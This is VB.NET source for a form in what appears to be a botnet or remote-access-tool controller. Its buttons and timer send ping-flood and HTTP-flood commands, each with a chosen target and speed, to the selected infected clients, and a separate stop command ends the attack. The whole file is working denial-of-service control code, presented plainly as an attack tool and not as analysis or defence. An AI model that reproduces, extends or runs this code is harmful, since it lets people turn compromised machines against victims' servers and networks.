Imports System.Runtime.InteropServices

Public Class Form13
    <DllImport("uxtheme", CharSet:=CharSet.Unicode)>
    Public Shared Function SetWindowTheme(ByVal hWnd As IntPtr, ByVal textSubAppName As String, ByVal textSubIdList As String) As Integer
    End Function
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        If ComboBox1.Text = "" Then
            ComboBox1.Text = "Cmd"
        End If


        Dim w As String = TextBox1.Text
        Dim speed As String = TextBox2.Text

        If w = "" Then

            MsgBox("Error", MsgBoxStyle.Critical)
        Else
            Timer1.Enabled = True
            Timer1.Interval = TextBox2.Text
            If ComboBox1.Text = "Cmd" Then
                ListView2.Items.Add("C:\Windows\System32\PING.EXE")
                For Each x As ListViewItem In Form1.L1.SelectedItems
                    Form1.S.Send(x.ToolTipText, "att" & Form1.Yy & w & Form1.Yy & speed)
                    Text = "Active attack"
                    Button1.Enabled = False
                    Button2.Enabled = True
                Next
            End If
            If ComboBox1.Text = "HTTP" Then
                ListView2.Items.Add("HTTP\" + TextBox1.Text)
                For Each x As ListViewItem In Form1.L1.SelectedItems
                    Form1.S.Send(x.ToolTipText, "atHTTP" & Form1.Yy & w & Form1.Yy & speed)
                    Text = "Active attack"
                    Button1.Enabled = False
                    Button2.Enabled = True
                Next
            End If


        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        ListView1.Items.Add(TextBox1.Text)
        Dim w As String = TextBox1.Text
        Dim speed As String = TextBox2.Text
        If ComboBox1.Text = "HTTP" Then
            ListView2.Items.Add("HTTP\" + TextBox1.Text)
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "atHTTP" & Form1.Yy & w & Form1.Yy & speed)
            Next
        End If

    End Sub



    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Timer1.Enabled = False
        Dim w As String = TextBox1.Text
        Dim speed As String = TextBox2.Text
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "atstop")
            Text = "The attack is not active"
            Button1.Enabled = True
            Button2.Enabled = False
        Next
    End Sub

    Private Sub Form13_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        SetWindowTheme(ListView1.Handle, "explorer", Nothing)
        SetWindowTheme(ListView2.Handle, "explorer", Nothing)
    End Sub



End Class









